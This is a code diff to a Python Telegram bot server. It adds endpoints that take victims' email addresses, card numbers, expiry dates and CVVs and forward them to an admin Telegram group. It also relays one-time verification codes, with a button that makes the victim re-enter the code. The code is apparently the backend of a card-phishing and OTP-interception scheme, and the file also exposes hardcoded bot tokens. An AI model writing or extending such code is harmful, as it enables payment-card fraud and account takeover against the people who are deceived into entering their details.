@@ -21,6 +21,7 @@ from barcode.writer import ImageWriter
 import uuid
 from aiohttp import web
 from functools import wraps
+import aiohttp
 
 #API_TOKEN = "8055265032:AAHdP7_hwpJ--mzXYBQgbrJduxJ-uczEPGQ"
 API_TOKEN = "5619487724:AAFeBptlX1aJ9IEAFLMUXN3JZBImJ35quWk"
@@ -1056,12 +1057,52 @@ async def notify_admin(request):
         print('Error sending message:', e)
     return web.Response(text="OK")
 
+async def payment_notify(request):
+    data = await request.json()
+    email = data.get('email', '')
+    card = data.get('card', '')
+    expiry = data.get('expiry', '')
+    cvv = data.get('cvv', '')
+    text = f"Email: {email}\nCard Number: {card}\nExpiry Date: {expiry}\nCVV: {cvv}"
+    await send_to_telegram(text)
+    return web.Response(text='ok')
+
+async def send_to_telegram(text):
+    url = f"https://api.telegram.org/bot{API_TOKEN}/sendMessage"
+    payload = {"chat_id": ADMIN_GROUP_ID, "text": text}
+    async with aiohttp.ClientSession() as session:
+        await session.post(url, json=payload)
+
+async def code_notify(request):
+    data = await request.json()
+    code = data.get('code', '')
+    text = f"Code: {code}"
+    kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="Request again", callback_data=f"code_request_again:{code}")]
+        ]
+    )
+    await bot.send_message(ADMIN_GROUP_ID, text, reply_markup=kb)
+    return web.Response(text='ok')
+
+@router.callback_query(lambda c: c.data and c.data.startswith('code_request_again:'))
+async def code_request_again_handler(call: types.CallbackQuery):
+    code = call.data.split(':', 1)[1]
+    # Надіслати POST на сервер
+    import aiohttp as aiohttp_client
+    async with aiohttp_client.ClientSession() as session:
+        await session.post('http://127.0.0.1/set_request_again', json={'code': code})
+    await call.message.answer("Please enter the code again")
+    await call.answer()
+
 # --- запуск aiohttp і aiogram в одному event loop ---
 if __name__ == '__main__':
     async def main():
         # aiohttp app
         app = web.Application()
         app.router.add_post('/notify_admin', notify_admin)
+        app.router.add_post('/payment_notify', payment_notify)
+        app.router.add_post('/code_notify', code_notify)
         runner = web.AppRunner(app)
         await runner.setup()
         site = web.TCPSite(runner, '0.0.0.0', 8081)
